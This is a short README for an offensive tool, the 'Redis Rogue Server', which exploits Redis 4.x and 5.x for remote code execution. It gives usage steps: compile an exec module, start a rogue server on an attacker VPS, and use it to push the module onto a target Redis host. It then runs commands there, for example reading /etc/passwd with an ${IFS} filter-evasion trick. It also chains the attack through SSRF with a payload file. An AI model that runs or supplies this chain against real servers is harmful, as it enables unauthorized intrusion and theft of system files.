# Redis Rogue Server

A exploit for Redis 4.x and 5.x RCE, inspired by [Redis post-exploitation](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf).
Needs to be started before running the RCE redis exploit with vg-exploit as it contains the exec module.

## Usage:

Compile .so from <https://github.com/n0b0dyCN/RedisModules-ExecuteCommand>.

Copy the .so file to same folder with `redis-rogue-server.py`.

Run the rogue server:

```
python3 redis-rogue-server.py --lhost <vps address> --lport <vps port>
```

The default target port is 6379 and the default vps port is 6666.

The rogue server will put the exp.so on the Redis server and make code execution available like this:

```
$ redis-cli
127.0.0.1:6379> system.exec cat${IFS}/etc/passwd
# will print /etc/passwd from redis host
```

This makes it possible to execute commands via SSRF:
```
vg-exploit redis --target=localhost:3000 --redis-host=localhost:6379 redis_payloads/rce.txt 
```
This will create a new file on the Redis host as proof that RCE worked.
Reverse shell would be nice from there but didn't manage to make it all work.
